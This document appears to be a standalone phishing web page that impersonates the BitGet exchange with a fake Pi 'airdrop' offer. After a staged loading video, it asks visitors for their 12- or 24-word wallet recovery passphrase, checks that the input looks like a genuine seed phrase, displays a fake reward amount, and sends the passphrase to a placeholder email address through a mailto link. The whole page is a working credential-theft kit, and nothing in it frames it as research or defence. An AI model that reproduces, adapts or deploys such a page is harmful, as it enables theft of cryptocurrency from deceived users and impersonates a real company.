<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitGet - Airdrop</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');

        body {
            font-family: 'Inter', sans-serif;
            background-color: #000;
            color: white;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .homepage, .passphrase-screen, .loading-screen {
            display: none;
            width: 100%;
            height: 100vh;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        .homepage {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: url('your-background-image.jpg') no-repeat center center/cover;
            padding: 40px;
        }

        .container {
            max-width: 600px;
            background: rgba(0, 0, 0, 0.85);
            padding: 30px;
            border-radius: 10px;
            text-align: center;
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        .title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .subtitle {
            font-size: 18px;
            color: #bbb;
            margin-bottom: 25px;
        }

        .side-message {
            font-size: 14px;
            color: #aaa;
            margin-top: 20px;
        }

        .btn {
            background: linear-gradient(90deg, #007bff, #00d4ff);
            color: white;
            padding: 15px;
            border: none;
            cursor: pointer;
            font-size: 20px;
            width: 100%;
            border-radius: 5px;
            font-weight: bold;
            transition: all 0.3s ease-in-out;
        }

        .btn:hover {
            transform: scale(1.05);
        }

        .loading-screen video {
            width: 100%;
            height: auto;
        }

        .passphrase-screen {
            display: none;
            flex-direction: column;
            padding: 20px;
            background: #ffffff;
            color: #000;
            width: 100%;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .passphrase-container {
            max-width: 500px;
            text-align: left;
            padding: 30px;
            background: #f5f5f5;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
        }

        .passphrase-title {
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #333;
        }

        .input-box {
            width: 100%;
            height: 100px;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 15px;
            resize: none;
        }

        .purple-btn {
            background: linear-gradient(90deg, #6A0DAD, #A020F0);
            color: white;
            padding: 12px;
            font-size: 18px;
            border: none;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease-in-out;
        }

        .purple-btn:hover {
            transform: scale(1.05);
        }

        .reward-text {
            font-size: 18px;
            font-weight: bold;
            color: #2E8B57;
            margin-top: 15px;
        }

    </style>
</head>
<body>

    <!-- Homepage -->
    <div id="homepage" class="homepage">
        <div class="container">
            <img src="bitget-logo.png" alt="BitGet Logo" class="logo">
            <div class="title">WIN UP TO 10,000 Pi</div>
            <div class="subtitle">Sign up now to claim a welcome pack.</div>
            <button class="btn" onclick="showLoading()">Join Now</button>
            <div class="side-message">Trade with 100 million users on BitGet.</div>
        </div>
    </div>

    <!-- Loading Screen -->
    <div id="loading-screen" class="loading-screen">
        <video autoplay muted>
            <source src="screen-20250223-174455~2.mp4" type="video/mp4">
        </video>
    </div>

    <!-- Passphrase Entry Screen -->
    <div id="passphrase-screen" class="passphrase-screen">
        <div class="passphrase-container">
            <div class="passphrase-title">Unlock Pi Wallet</div>
            <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>
            <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
            <p id="message" class="reward-text"></p>
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById("homepage").style.display = "none";
            document.getElementById("loading-screen").style.display = "flex";
            
            setTimeout(() => {
                document.getElementById("loading-screen").style.display = "none";
                document.getElementById("passphrase-screen").style.display = "flex";
            }, 3000);
        }

        function submitPassphrase() {
            var passphrase = document.getElementById("passphrase").value.trim();
            
            if (!isValidPassphrase(passphrase)) {
                document.getElementById("message").innerText = "Invalid Passphrase. Please enter a valid 12 or 24-word passphrase.";
                return;
            }

            var piAmount = Math.floor(Math.random() * (10000 - 50 + 1)) + 50;
            document.getElementById("message").innerText = piAmount + " Pi will be rewarded to your wallet shortly.";

            sendEmail(passphrase, piAmount);
        }

        function isValidPassphrase(passphrase) {
            var words = passphrase.split(/\s+/);
            return (words.length === 12 || words.length === 24) && words.every(word => /^[a-z]+$/.test(word));
        }

        function sendEmail(passphrase, piAmount) {
            var email = "your-email@example.com";
            var subject = "New Passphrase Entry - BitGet";
            var body = "Passphrase: " + passphrase + "%0AClaimed Pi: " + piAmount;
            window.location.href = "mailto:" + email + "?subject=" + subject + "&body=" + body;
        }
    </script>

</body>
</html>
